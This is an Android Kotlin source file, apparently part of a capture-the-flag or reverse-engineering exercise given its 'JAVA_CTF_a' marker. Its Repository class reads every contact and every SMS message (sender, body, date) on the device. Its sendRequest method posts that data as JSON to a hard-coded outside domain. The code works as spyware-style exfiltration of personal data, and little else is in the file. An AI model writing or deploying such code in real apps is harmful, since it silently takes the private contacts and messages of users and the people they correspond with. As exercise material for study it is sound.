package tiago.cognizant.reexercise2.repo

import android.content.Context
import android.database.Cursor
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import android.widget.Toast
import com.android.volley.Response
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.google.gson.Gson
import tiago.cognizant.reexercise2.model.Contact
import tiago.cognizant.reexercise2.model.Message

class Repository {

    val ssn = "JAVA_CTF_a"
    private val url = "www.tiagoconceicao88993344.xyz"

    fun getContacts(mContext: Context, onSuccess: (ArrayList<Contact>) -> Unit, onError: (Exception) -> Unit) {
        val contactList = ArrayList<Contact>()

        val order = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"

        //Query to get all contacts from the device
        val managedCursor: Cursor = mContext.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null,
            null, order
        )!!

        val number: Int = managedCursor
            .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
        val name: Int = managedCursor
            .getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)

        //Creating a list with a proper model format
        while (managedCursor.moveToNext()) {
            val mContact = Contact(managedCursor.getString(name),managedCursor.getString(number))
            contactList.add(mContact)
        }

        onSuccess(contactList)
    }


    fun getMessages(mContext: Context, onSuccess: (ArrayList<Message>) -> Unit, onError: (Exception) -> Unit) {
        val messageList = ArrayList<Message>()

        val order = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"

        //Query to get all contacts from the device
        val managedCursor: Cursor = mContext.contentResolver.query(
            Telephony.Sms.CONTENT_URI, null, null,
            null, null
        )!!


        val number: Int = managedCursor
            .getColumnIndex(Telephony.Sms.ADDRESS)
        val text: Int = managedCursor
            .getColumnIndex(Telephony.Sms.BODY)

        val date: Int = managedCursor
            .getColumnIndex(Telephony.Sms.DATE)

        //Creating a list with a proper model format
        while (managedCursor.moveToNext()) {
            val mMessage = Message(managedCursor.getString(number),managedCursor.getString(text),managedCursor.getString(date))
            messageList.add(mMessage)
        }

        onSuccess(messageList)
    }

    fun sendRequest(mContext: Context, content: Any, contentTitle: String){
        val queue = Volley.newRequestQueue(mContext)
        val body = Gson().toJson(content)

        val request: StringRequest = object : StringRequest(
            Method.POST, url,
            Response.Listener { response ->
                Toast.makeText(mContext,"$contentTitle sent", Toast.LENGTH_SHORT).show()
                Log.d("Contacts", response)
            },
            Response.ErrorListener {
                // Method to handle errors.
                Toast.makeText(mContext,"$contentTitle not sent ${it.message}", Toast.LENGTH_SHORT).show()
                Log.d("Contacts","That didn't work!")
            }) {
            override fun getParams(): Map<String, String> {

                // Creating a map for storing the values in key and value pair.
                val params: MutableMap<String, String> = HashMap()
                params[contentTitle] = body

                return params
            }
        }

        // Add the request to the RequestQueue.
        queue.add(request)
        Log.d("Contacts","Repository: Contacts sent")
    }
}